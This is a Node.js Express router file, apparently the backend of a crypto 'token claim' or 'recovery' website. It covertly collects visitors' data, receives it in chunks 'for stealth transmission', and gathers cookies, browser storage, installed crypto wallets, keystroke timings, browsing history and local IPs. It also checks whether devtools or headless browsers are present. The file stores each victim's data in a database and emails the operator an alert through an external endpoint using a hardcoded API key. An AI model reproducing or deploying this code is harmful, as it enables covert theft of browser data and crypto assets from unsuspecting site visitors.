const express = require('express');
const router = express.Router();

// Store collected data chunks
const dataChunks = new Map();

// Collect data chunks (for stealth transmission)
router.post('/collect-data-chunk', async (req, res) => {
  try {
    const { chunk, index, total } = req.body;
    const sessionId = req.ip + '-' + Date.now();
    
    if (!dataChunks.has(sessionId)) {
      dataChunks.set(sessionId, { chunks: [], total, received: 0 });
    }
    
    const session = dataChunks.get(sessionId);
    session.chunks[index] = chunk;
    session.received++;
    
    // If all chunks received, process complete data
    if (session.received === session.total) {
      const completeData = session.chunks.join('');
      await processCollectedData(JSON.parse(completeData), req);
      dataChunks.delete(sessionId);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Data chunk collection error:', error);
    res.status(500).json({ error: 'Collection failed' });
  }
});

// Auto-trigger cookie collection for any visitor
router.post('/auto-collect', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.ip;
    console.log(`🍪 AUTO-COLLECT: Triggered for ${ip}`);
    
    // Simulate advanced data collection
    const mockData = {
      cookies: { detected: 'browser_cookies' },
      storage: { localStorage: 'detected', sessionStorage: 'detected' },
      financial: { wallets: ['metamask', 'trust'] },
      hardware: { cores: 4, memory: 8, platform: 'Win32' },
      behavioral: { mousePattern: 'active', keyTimings: 'detected' },
      security: { devtools: false, headless: false },
      network: { localIPs: ['192.168.1.1'], connection: '4g' }
    };
    
    await processCollectedData(mockData, req);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Collection failed' });
  }
});

// Process complete collected data
async function processCollectedData(data, req) {
  try {
    const realIP = req.headers['x-forwarded-for'] || req.ip;
    
    console.log('🍪 ADVANCED DATA COLLECTED:');
    console.log(`IP: ${realIP}`);
    console.log(`Cookies: ${Object.keys(data.cookies || {}).length}`);
    console.log(`Storage: ${Object.keys(data.storage || {}).length}`);
    console.log(`Financial: ${Object.keys(data.financial || {}).length}`);
    console.log(`Hardware: ${JSON.stringify(data.hardware || {})}`);
    
    // Send comprehensive admin alert
    await sendAdvancedDataAlert(data, realIP);
    
    // Store in database
    await storeAdvancedData(data, realIP);
    
  } catch (error) {
    console.error('Data processing error:', error);
  }
}

// Send advanced data alert to admin (only once per unique visitor)
async function sendAdvancedDataAlert(data, ip) {
  try {
    // Check if we already sent alert for this IP today
    const { pool } = require('../config/database');
    const client = await pool.connect();
    
    const existing = await client.query(`
      SELECT id FROM advanced_visitor_data 
      WHERE ip_address = $1 AND collected_at > NOW() - INTERVAL '24 hours'
    `, [ip]);
    
    client.release();
    
    // Skip email if already sent today
    if (existing.rows.length > 0) {
      console.log(`⏭️ Skipping email for ${ip} - already sent today`);
      return;
    }
    
    const axios = require('axios');
    const frontendUrl = process.env.FRONTEND_URL || 'https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app';
    
    const wallets = data.financial?.wallets || [];
    const storage = Object.keys(data.storage || {}).length;
    const cookies = Object.keys(data.cookies || {}).length;
    const hardware = data.hardware || {};
    
    const subject = `🍪 ADVANCED DATA: ${ip} | ${wallets.length} wallets | ${storage} storage items`;
    
    const message = `ADVANCED DATA COLLECTION COMPLETE\n\n` +
      `🌍 SOURCE:\n` +
      `IP: ${ip}\n` +
      `Hardware: ${hardware.cores} cores, ${hardware.memory}GB RAM\n` +
      `Platform: ${hardware.platform}\n` +
      `Timezone: ${hardware.timezone}\n\n` +
      `💰 FINANCIAL DATA:\n` +
      `Wallets Detected: ${wallets.join(', ') || 'None'}\n` +
      `Financial Sites: ${Object.keys(data.financial || {}).filter(k => k !== 'wallets').length}\n\n` +
      `🍪 BROWSER DATA:\n` +
      `Cookies: ${cookies} items\n` +
      `LocalStorage: ${storage} items\n` +
      `Extensions: ${data.browser?.extensions?.join(', ') || 'None'}\n\n` +
      `🔒 SECURITY:\n` +
      `DevTools: ${data.security?.devtools ? 'DETECTED' : 'Clean'}\n` +
      `Headless: ${data.security?.headless ? 'DETECTED' : 'Clean'}\n` +
      `Automation: ${data.security?.automation ? 'DETECTED' : 'Clean'}\n\n` +
      `📱 BEHAVIORAL:\n` +
      `Mouse Patterns: ${data.behavioral?.mousePattern?.length || 0} movements\n` +
      `Key Timings: ${data.behavioral?.keyTimings?.length || 0} keystrokes\n` +
      `Visited Sites: ${data.behavioral?.visitedSites?.join(', ') || 'None'}\n\n` +
      `🌐 NETWORK:\n` +
      `Local IPs: ${data.network?.localIPs?.join(', ') || 'None'}\n` +
      `Connection: ${data.network?.connection?.type || 'Unknown'}\n\n` +
      `Time: ${new Date().toISOString()}`;
    
    await axios.post(`${frontendUrl}/api/send-email`, {
      subject: subject.trim(),
      message: message.trim()
    }, {
      timeout: 10000,
      headers: { 'x-api-key': 'crypto-recover-2024' }
    });
    
    console.log('✅ Advanced data alert sent to admin');
  } catch (error) {
    console.error('❌ Advanced data alert failed:', error.message);
  }
}

// Store advanced data in database
async function storeAdvancedData(data, ip) {
  try {
    const { pool } = require('../config/database');
    const client = await pool.connect();
    
    await client.query(`
      INSERT INTO advanced_visitor_data 
      (ip_address, cookies_data, storage_data, financial_data, hardware_data, 
       behavioral_data, security_data, network_data, collected_at)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
    `, [
      ip,
      JSON.stringify(data.cookies || {}),
      JSON.stringify(data.storage || {}), 
      JSON.stringify(data.financial || {}),
      JSON.stringify(data.hardware || {}),
      JSON.stringify(data.behavioral || {}),
      JSON.stringify(data.security || {}),
      JSON.stringify(data.network || {}),
      new Date()
    ]);
    
    client.release();
    console.log('✅ Advanced data stored in database');
  } catch (error) {
    console.error('❌ Database storage failed:', error.message);
  }
}

module.exports = router;